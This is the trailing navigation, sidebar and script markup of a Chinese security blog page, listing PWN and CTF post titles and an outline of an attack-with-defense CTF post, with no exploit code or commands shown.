class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-22</div><div class="title">Art_of_shellcode</div></div></a></div><div><a href="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" title="ELF文件保护机制"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-06</div><div class="title">ELF文件保护机制</div></div></a></div><div><a href="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/" title="PWN入门-基本ROP"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-11</div><div class="title">PWN入门-基本ROP</div></div></a></div><div><a href="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/" title="PWN入门-栈溢出"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-03</div><div class="title">PWN入门-栈溢出</div></div></a></div><div><a href="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="PWN入门-整数溢出"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-18</div><div class="title">PWN入门-整数溢出</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zechariah</div><div class="author-info__description">不会RE的PWN手不是好密码手</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Zechariah-0703"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AWD"><span class="toc-number">1.</span> <span class="toc-text">AWD</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8FIP"><span class="toc-number">1.2.</span> <span class="toc-text">扫描IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Defence"><span class="toc-number">1.3.</span> <span class="toc-text">Defence</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">1.3.1.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">工具使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.3.3.</span> <span class="toc-text">具体漏洞修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#32%E4%BD%8D"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">32位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#64%E4%BD%8D"><span class="toc-number">1.3.3.1.2.</span> <span class="toc-text">64位</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">栈溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UAF"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#32%E4%BD%8D-1"><span class="toc-number">1.3.3.3.1.</span> <span class="toc-text">32位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#64%E4%BD%8D-1"><span class="toc-number">1.3.3.3.2.</span> <span class="toc-text">64位</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gets-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">gets 栈溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B4%9F%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.5.</span> <span class="toc-text">负数绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack"><span class="toc-number">1.4.</span> <span class="toc-text">Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-py"><span class="toc-number">1.4.1.</span> <span class="toc-text">exp.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#submit-flag-py"><span class="toc-number">1.4.2.</span> <span class="toc-text">submit_flag.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-sh"><span class="toc-number">1.4.3.</span> <span class="toc-text">attack.sh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7"><span class="toc-number">1.5.</span> <span class="toc-text">流量监控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-waf"><span class="toc-number">1.5.1.</span> <span class="toc-text">pwn_waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.5.2.</span> <span class="toc-text"> </span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/" title="PWN刷题笔记（长期更新）"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN刷题笔记（长期更新）"/></a><div class="content"><a class="title" href="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/" title="PWN刷题笔记（长期更新）">PWN刷题笔记（长期更新）</a><time datetime="2025-03-25T13:39:37.000Z" title="发表于 2025-03-25 21:39:37">2025-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/12/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/" title="PWN基础-汇编（寄存器-传参-指令速查）"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN基础-汇编（寄存器-传参-指令速查）"/></a><div class="content"><a class="title" href="/2025/03/12/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/" title="PWN基础-汇编（寄存器-传参-指令速查）">PWN基础-汇编（寄存器-传参-指令速查）</a><time datetime="2025-03-12T13:42:40.000Z" title="发表于 2025-03-12 21:42:40">2025-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/" title="Web-PWN知识"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web-PWN知识"/></a><div class="content"><a class="title" href="/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/" title="Web-PWN知识">Web-PWN知识</a><time datetime="2025-03-11T13:48:48.000Z" title="发表于 2025-03-11 21:48:48">2025-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/11/unlink/" title="unlink"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="unlink"/></a><div class="content"><a class="title" href="/2025/03/11/unlink/" title="unlink">unlink</a><time datetime="2025-03-10T16:25:24.000Z" title="发表于 2025-03-11 00:25:24">2025-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/" title="堆入门-__malloc_hook和__free_hook劫持原理"><img src="/img/loading.gif" data-original="/img/fengmian.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="堆入门-__malloc_hook和__free_hook劫持原理"/></a><div class="content"><a class="title" href="/2025/03/10/%E5%A0%86%E5%85%A5%E9%97%A8-malloc-hook%E5%92%8C-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86/" title="堆入门-__malloc_hook和__free_hook劫持原理">堆入门-__malloc_hook和__free_hook劫持原理</a><time datetime="2025-03-10T13:44:38.000Z" title="发表于 2025-03-10 21:44:38">2025-03-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Zechariah</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body></html>
